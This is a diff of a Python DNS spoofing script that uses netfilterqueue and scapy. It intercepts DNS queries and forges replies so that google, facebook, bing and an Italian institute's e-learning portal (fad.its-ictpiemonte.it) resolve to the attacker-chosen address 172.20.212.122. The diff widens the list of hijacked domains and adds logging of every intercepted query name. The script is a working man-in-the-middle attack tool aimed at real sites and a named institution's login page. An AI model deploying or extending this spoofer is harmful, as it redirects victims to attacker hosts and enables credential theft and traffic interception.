@@ -4,11 +4,15 @@ from netfilterqueue import NetfilterQueue
 
 
 dns_hosts = {
-    b"www.google.it.": "10.5.7.190",
-    b"google.it.": "10.5.7.190",
-    b"www.google.com.": "10.5.7.190",
-    b"it.wikipedia.org": "10.5.7.190",
-    b"google.com.": "10.5.7.190"
+    b"www.google.it.": "172.20.212.122",
+    b"google.it.": "172.20.212.122",
+    b"www.google.com.": "172.20.212.122",
+    b"facebook.com.": "172.20.212.122",
+    b"www.facebook.com.": "172.20.212.122",
+    b"www.fad.its-ictpiemonte.it.": "172.20.212.122",
+    b"fad.its-ictpiemonte.it.": "172.20.212.122",
+    b"bing.com.": "172.20.212.122",
+    b"google.com.": "172.20.212.122"
 }
 def process_packet(packet):
     scapy_packet = IP(packet.get_payload())
@@ -24,8 +28,9 @@ def process_packet(packet):
 
 def modify_packet(packet):
     qname = packet[DNSQR].qname
+    print("[GOT] ",qname)
     if qname not in dns_hosts:
-        print("packet not:", qname)
+        print("packet not modified:", qname)
         return packet
     packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
     packet[DNS].ancount = 1
